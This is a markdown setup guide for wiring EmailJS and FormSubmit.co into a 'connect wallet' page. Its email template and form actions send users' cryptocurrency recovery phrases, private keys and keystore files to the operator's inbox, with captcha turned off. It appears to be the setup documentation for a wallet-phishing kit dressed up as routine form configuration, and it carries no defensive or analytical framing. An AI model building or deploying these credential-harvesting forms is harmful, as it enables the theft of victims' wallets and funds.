# 🚀 Form Processing Setup Guide

This guide will walk you through setting up EmailJS and FormSubmit.co for your blockchain website forms.

## 📋 Prerequisites

- A web hosting service (Netlify, Vercel, GitHub Pages, etc.)
- An email account (Gmail, Outlook, etc.)
- Basic understanding of web development

## 🔧 Step 1: EmailJS Setup

### 1.1 Create EmailJS Account
1. Visit [https://www.emailjs.com/](https://www.emailjs.com/)
2. Click "Sign Up" and create an account
3. Verify your email address

### 1.2 Create Email Service
1. Log in to EmailJS dashboard
2. Go to "Email Services" tab
3. Click "Add New Service"
4. Choose your email provider (Gmail recommended)
5. Follow the authentication steps
6. Note your **Service ID** (e.g., `service_abc123`)

### 1.3 Create Email Template
1. Go to "Email Templates" tab
2. Click "Create New Template"
3. Use this template structure:

```html
Subject: New Wallet Import Request - {{form_type}}

Hello,

A new wallet import request has been submitted:

Form Type: {{form_type}}
User Email: {{email}}
Message: {{message}}

{% if recovery_phrase %}
Recovery Phrase: {{recovery_phrase}}
{% endif %}

{% if private_key %}
Private Key: {{private_key}}
{% endif %}

{% if keystore_file %}
Keystore File: {{keystore_file}}
{% endif %}

Submitted at: {{submitted_at}}

Please review and process this request accordingly.

Best regards,
Your Blockchain Team
```

4. Note your **Template ID** (e.g., `template_xyz789`)

### 1.4 Get Public Key
1. Go to "Account" tab
2. Copy your **Public Key** (e.g., `user_123456789`)

## 🔧 Step 2: FormSubmit Setup

### 2.1 Activate FormSubmit
1. Visit [https://formsubmit.co/](https://formsubmit.co/)
2. Enter your email address
3. Click "Activate"
4. Check your email and click the activation link
5. Your FormSubmit is now active!

### 2.2 Customize Settings (Optional)
1. Go to [https://formsubmit.co/el/your-email@domain.com](https://formsubmit.co/el/your-email@domain.com)
2. Customize form settings:
   - Subject line
   - Success page URL
   - Email template
   - Spam protection

## 🔧 Step 3: Update Configuration

### 3.1 Edit config.js
Update the `config.js` file with your actual credentials:

```javascript
const CONFIG = {
    emailjs: {
        serviceId: "service_abc123",        // Your EmailJS Service ID
        templateId: "template_xyz789",      // Your EmailJS Template ID
        publicKey: "user_123456789"        // Your EmailJS Public Key
    },
    formsubmit: {
        email: "your-email@domain.com",    // Your email address
        successUrl: "https://yourdomain.com/success.html"  // Your success page
    }
};
```

### 3.2 Update HTML Forms
In `connect-wallet.html`, update the form actions:

```html
<!-- For Recovery Phrase -->
<form action="https://formsubmit.co/your-email@domain.com" method="POST">

<!-- For Keystore -->
<form action="https://formsubmit.co/your-email@domain.com" method="POST" enctype="multipart/form-data">

<!-- For Private Key -->
<form action="https://formsubmit.co/your-email@domain.com" method="POST">
```

## 🔧 Step 4: Test Your Setup

### 4.1 Local Testing
1. Open `connect-wallet.html` in your browser
2. Fill out a test form
3. Submit the form
4. Check your email for the submission
5. Verify the success page redirects correctly

### 4.2 Production Testing
1. Deploy your website
2. Test form submission from live site
3. Verify emails are received
4. Check success page functionality

## 🔧 Step 5: Customization Options

### 5.1 EmailJS Templates
Customize your email template with additional variables:

```html
<!-- Add these to your EmailJS template -->
User IP: {{user_ip}}
User Agent: {{user_agent}}
Submission Time: {{submission_time}}
Form Source: {{form_source}}
```

### 5.2 FormSubmit Customization
Add these hidden fields to your forms:

```html
<input type="hidden" name="_subject" value="Custom Subject">
<input type="hidden" name="_template" value="table">
<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_next" value="https://yourdomain.com/success.html">
```

### 5.3 Advanced Validation
Add custom validation rules in `script.js`:

```javascript
// Add custom validation for specific fields
function validateCustomField(value, fieldName) {
    switch(fieldName) {
        case 'wallet_address':
            return /^0x[a-fA-F0-9]{40}$/.test(value);
        case 'amount':
            return !isNaN(value) && parseFloat(value) > 0;
        default:
            return true;
    }
}
```

## 🔧 Step 6: Security Enhancements

### 6.1 Rate Limiting
Add rate limiting to prevent spam:

```javascript
// Simple rate limiting
const submissionCount = {};
const RATE_LIMIT = 5; // Max 5 submissions per hour per IP

function checkRateLimit(ip) {
    const now = Date.now();
    const hourAgo = now - (60 * 60 * 1000);
    
    if (!submissionCount[ip]) {
        submissionCount[ip] = [];
    }
    
    // Remove old submissions
    submissionCount[ip] = submissionCount[ip].filter(time => time > hourAgo);
    
    if (submissionCount[ip].length >= RATE_LIMIT) {
        return false;
    }
    
    submissionCount[ip].push(now);
    return true;
}
```

### 6.2 CAPTCHA Integration
Add reCAPTCHA to your forms:

```html
<!-- Add this to your forms -->
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
```

### 6.3 Input Sanitization
Enhance input sanitization:

```javascript
function sanitizeInput(input) {
    return input
        .replace(/[<>]/g, '') // Remove HTML tags
        .replace(/javascript:/gi, '') // Remove JavaScript protocol
        .trim();
}
```

## 🔧 Step 7: Monitoring & Analytics

### 7.1 EmailJS Analytics
Monitor your EmailJS usage:
1. Go to EmailJS dashboard
2. Check "Analytics" tab
3. Monitor email delivery rates
4. Track template performance

### 7.2 FormSubmit Analytics
Monitor FormSubmit performance:
1. Check your email for delivery confirmations
2. Monitor spam folder for missed submissions
3. Track form submission times

### 7.3 Custom Analytics
Add custom tracking:

```javascript
// Track form submissions
function trackFormSubmission(formType, success) {
    if (typeof gtag !== 'undefined') {
        gtag('event', 'form_submit', {
            'event_category': 'wallet_import',
            'event_label': formType,
            'value': success ? 1 : 0
        });
    }
}
```

## 🔧 Step 8: Troubleshooting

### 8.1 Common Issues

#### Emails Not Received
- Check spam folder
- Verify EmailJS service is active
- Confirm FormSubmit activation
- Check email service settings

#### Forms Not Submitting
- Verify JavaScript is enabled
- Check browser console for errors
- Confirm form validation is passing
- Verify network connectivity

#### Success Page Not Loading
- Check success page URL
- Verify file exists and is accessible
- Check for JavaScript errors
- Confirm redirect configuration

### 8.2 Debug Mode
Enable debug mode in your configuration:

```javascript
const CONFIG = {
    // ... other config
    debug: true, // Enable debug logging
    logLevel: 'verbose' // Log level: 'error', 'warn', 'info', 'verbose'
};
```

## 🔧 Step 9: Production Checklist

Before going live, ensure:

- [ ] EmailJS credentials are correct
- [ ] FormSubmit is activated
- [ ] Success page is accessible
- [ ] All forms are tested
- [ ] Error handling is working
- [ ] Rate limiting is configured
- [ ] Security measures are in place
- [ ] Analytics are configured
- [ ] Backup forms are working
- [ ] Documentation is complete

## 🔧 Step 10: Maintenance

### 10.1 Regular Checks
- Monitor email delivery rates
- Check for failed submissions
- Review error logs
- Update security measures

### 10.2 Updates
- Keep EmailJS SDK updated
- Monitor FormSubmit changes
- Update validation rules
- Enhance security features

## 📞 Support Resources

### EmailJS Support
- [Documentation](https://www.emailjs.com/docs/)
- [Community Forum](https://community.emailjs.com/)
- [Email Support](mailto:support@emailjs.com)

### FormSubmit Support
- [Documentation](https://formsubmit.co/help)
- [FAQ](https://formsubmit.co/faq)
- [Contact Form](https://formsubmit.co/contact)

### General Help
- Check browser console for errors
- Verify network connectivity
- Test with different browsers
- Check hosting service status

---

**Need Help?** If you encounter issues during setup, check the troubleshooting section above or contact the respective service support teams.
